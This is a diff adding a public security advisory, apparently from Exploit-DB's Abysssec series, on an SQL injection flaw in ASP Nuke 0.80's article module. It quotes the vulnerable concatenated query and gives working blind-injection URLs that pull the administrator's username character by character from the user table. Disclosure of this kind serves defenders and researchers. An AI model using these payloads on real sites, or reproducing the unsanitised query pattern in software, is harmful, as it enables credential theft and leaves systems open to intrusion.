@@ -1,0 +1,69 @@
+'''
+  __  __  ____         _    _ ____  
+ |  \/  |/ __ \   /\  | |  | |  _ \ 
+ | \  / | |  | | /  \ | |  | | |_) |
+ | |\/| | |  | |/ /\ \| |  | |  _ < 
+ | |  | | |__| / ____ \ |__| | |_) |
+ |_|  |_|\____/_/    \_\____/|____/ 
+
+http://www.exploit-db.com/moaub11-asp-nuke-sql-injection-vulnerability/
+'''
+
+Abysssec Inc Public Advisory
+ 
+ 
+  Title            :  ASP Nuke Sql Injection Vulnerability
+  Affected Version :  AspNuke 0.80
+  Discovery        :  www.abysssec.com
+  Vendor	   :  http://www.aspnuke.com
+
+
+  Download Links   :  http://sourceforge.net/projects/aspnukecms/
+
+ 
+Description :
+===========================================================================================      
+
+1)- SQl Injection
+  This version of ASP Nuke is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+
+  Valnerable Code  in .../module/article/article/article.asp:
+
+  Ln 37:
+        sStat = "SELECT	art.ArticleID, art.Title, art.ArticleBody, " &_
+		"		auth.FirstName, auth.LastName, " &_
+		"		cat.CategoryName, art.CommentCount, " &_
+		"		art.Created " &_
+		"FROM	tblArticle art " &_
+		"INNER JOIN	tblArticleAuthor auth ON art.AuthorID = auth.AuthorID " &_
+		"INNER JOIN	tblArticleToCategory atc ON atc.ArticleID = art.ArticleID " &_
+		"INNER JOIN	tblArticleCategory cat ON atc.CategoryID = cat.CategoryID " &_
+		"WHERE	art.ArticleID = " & steForm("articleid") & " " &_
+		"AND	art.Active <> 0 " &_
+		"AND	art.Archive = 0"
+
+
+   Considering to the code, you can browse these URLs:
+   
+       http://www.site.com/module/article/article/article.asp?articleid=7'                 (the false Query will be shown)
+       http://www.site.com/module/article/article/article.asp?articleid=7+and+'a'='a'--    (this Query is always  true) 
+
+   with the following URL you can find the first character of Username:  
+       http://www.site.com/module/article/article/article.asp?articleid=7+and+'a'=(select+SUBSTRING(Username,1,1)+from+tblUser)--
+   
+   and second character:
+       http://www.site.com/module/article/article/article.asp?articleid=7+and+'a'=(select+SUBSTRING(Username,2,1)+from+tblUser)--
+   
+   and so on.
+   
+   So you gain Admin's information like this:
+       Username : admin
+       Password : (sha256 hash)
+
+
+   Which the Password was encrypted by SHA algorithm using .../lib/sha256.asp file.
+
+
+===========================================================================================
+ 
